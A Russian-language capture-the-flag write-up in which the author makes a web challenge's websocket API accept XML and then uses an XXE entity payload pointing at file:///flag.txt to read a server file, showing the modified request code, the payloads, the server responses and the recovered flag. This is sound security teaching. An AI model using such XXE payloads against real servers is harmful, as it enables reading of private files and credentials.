Рассмотрим исходный код страницы. Основной скрипт лежит в файле script.js.
При нажатии на кнопку "Calculate!" отправляется запрос по вебсокету на сервер, запрос шифруется с помощью AES.
В функции calculate мы можем увидеть формат запроса:
```
{format: 'json', data: {countries: countries (array), startdate: startDate (string), enddate: endDate (string), resttype: restType (int)}}
```
Заметим, что мы отправляем формат, в который кодируются данные, по стандарту это JSON. Изменим его на XML и проверим, обрабатывает ли сервер запросы такого формата.

Используя инструменты разработчика Chrome, перепишем обработчик событий, который принимает сообщения от вебсокета следующим образом:
```
socket.addEventListener('message', (event) => {
  if (event.data == 'connected') return;
  let data = event.data;
  console.log(data)
});
```
для того, чтобы сразу можно было видеть данные пришедшие с сервера.

В функции calculate заменим format: 'json' на format: 'xml'.
Теперь нажав на кнопку "Calculate!", получаем в консоли ошибку с сервера:
```
{"error":"Error: XML must be a string or buffer\n    at Object.module.exports.fromXml ...
```
Это показывает, что сервер умеет обрабатывать XML, просто мы ему отправили не XML, из-за этого и возникла ошибка.

В том словаре, который мы отправляем, содержатся только ключи format и data. Этот словарь мы отправляем в формате JSON. Из этого можно понять, что сервер при обработке
сначала получит словарь с помощью JSON, посмотрим на значение под ключом format, и на основании этого будет раскодировать data. Таким образом, в data мы можем положить
наши данные в xml формате. Воспользуемся онлайн конвертером JSON в XML(https://www.convertjson.com/json-to-xml.htm), преобразуем данные, которые мы обычно отправляем в json, в xml,
и отправим это на сервер, чтобы проверить, действительно ли мы можем в data положить данные в xml формате. Создадим такой JSON для примера:
```
{"countries": ["1", "2", "3"], startdate: "1", enddate: "1", resttype: 1}
```
(также мы заранее проверили, что отправка таких данных в JSON не приводит к ошибке, и все верно обрабатывается). С помощью онлайн-конвертера получили следующий XML:
```
<?xml version="1.0" encoding="UTF-8" ?>
<root>
  <countries>1</countries>
  <countries>2</countries>
  <countries>3</countries>
  <startdate>1</startdate>
  <enddate>1</enddate>
  <resttype>1</resttype>
</root>
```
Изменим в script.js 83 строку на ```let data = JSON.stringify(encrypted({format: 'xml', data: \`<?xml version="1.0" encoding="UTF-8" ?><data><countries>1</countries><countries>2</countries><countries>3</countries><startdate>1</startdate><enddate>1</enddate><resttype>1</resttype></data>\`}));```

(также заменяем <root> на <data>, потому что наши данные хранятся под ключом data)

В консоли видем зашифрованный ответ, используя функцию decrypt расшифруем его, и получаем:
```
{"format":"xml","data":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<data>\\n  <countries>1</countries>\\n  <countries>2</countries>\\n  <countries>3</countries>\\n  <startdate>1</startdate>\\n  <enddate>1</enddate>\\n  <resttype>1</resttype>\\n  <price>0</price>\\n</data>\\n"}
```

Это значит что сервер верно обрабатывает XML.
Теперь, так как мы можем вставлять любой XML, воспользуемся уязвимостью xxe.

Добавим в наш XML строчку: 
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
```
это нам позволит прочитать содержимое файла flag.txt, и затем, если мы где-то
в xml вставим '&xxe;', то оно автоматически заменится на содержимое файла.

Так как сервер нам отправляет все данные что мы ему прислали в ответ, поместим '&xxe;' в первый элемент списка countries.
Итоговый XML выглядит вот так.

```
<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><data><countries>&xxe;</countries><countries>2</countries><countries>3</countries><startdate>1</startdate><enddate>1</enddate><resttype>1</resttype></data>
```

Получаем ответ от сервера:
```
{"format":"xml","data":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!DOCTYPE foo [\\n<!ENTITY xxe SYSTEM \\"file:///flag.txt\\">\\n]>\\n<data>\\n  <countries>nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}\\n</countries>\\n  <countries>2</countries>\\n  <countries>3</countries>\\n  <startdate>1</startdate>\\n  <enddate>1</enddate>\\n  <resttype>1</resttype>\\n  <price>0</price>\\n</data>\\n"}
```

В первом элементе списка countries лежит флаг.